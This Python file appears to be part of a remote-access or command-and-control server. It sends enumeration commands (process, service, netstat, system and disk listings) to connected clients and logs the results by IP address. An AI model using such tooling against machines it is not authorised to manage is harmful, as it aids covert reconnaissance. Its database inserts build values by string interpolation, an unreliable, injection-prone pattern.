# Modules/session/commands/system_commands.py

import ssl
from typing import Tuple
from datetime import datetime
import colorama
from ..transfer import send_data, receive_data
from ...global_objects import logger

class SystemCommands:
    """Handles system enumeration commands."""

    def list_processes(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """Lists processes running on the client."""
        logger.info(f"Requesting process list from {r_address[0]}")
        send_data(conn, "list_processes")
        processes = receive_data(conn)
        self.database.insert_entry(
            "Processes", f'"{r_address[0]}", "{processes.replace("\"", "\"\"")}", "{datetime.now()}"'
        )
        print(processes)
        return

    def systeminfo(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """Gets the system info of the client."""
        logger.info(f"Requesting system info from {r_address[0]}")
        send_data(conn, "system_info")
        data = receive_data(conn)
        self.database.insert_entry(
            "System_info", f'"{r_address[0]}", "{data.replace("\"", "\"\"")}", "{datetime.now()}"'
        )
        print(data)
        return

    def list_services(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """Lists services on the client."""
        logger.info(f"Requesting services list from {r_address[0]}")
        send_data(conn, "list_services")
        services = receive_data(conn)
        self.database.insert_entry(
            "Services", f'"{r_address[0]}", "{services.replace("\"", "\"\"")}", "{datetime.now()}"'
        )
        print(services)
        return

    def netstat(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """Prints netstat details from the client."""
        logger.info(f"Requesting netstat from {r_address[0]}")
        send_data(conn, "netstat")
        netstat_output = receive_data(conn) # Assuming client now sends data in one go
        print(colorama.Fore.YELLOW + netstat_output)
        self.database.insert_entry(
            "Netstat", f'"{r_address[0]}", "{netstat_output.replace("\"", "\"\"")}", "{datetime.now()}"'
        )
        return

    def diskusage(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """Prints the disk usage for the client."""
        logger.info(f"Requesting disk usage from {r_address[0]}")
        send_data(conn, "disk_usage")
        results = receive_data(conn)
        self.database.insert_entry(
            "Disk", f'"{r_address[0]}", "{results.replace("\"", "\"\"")}", "{datetime.now()}"'
        )
        print(colorama.Fore.YELLOW + results)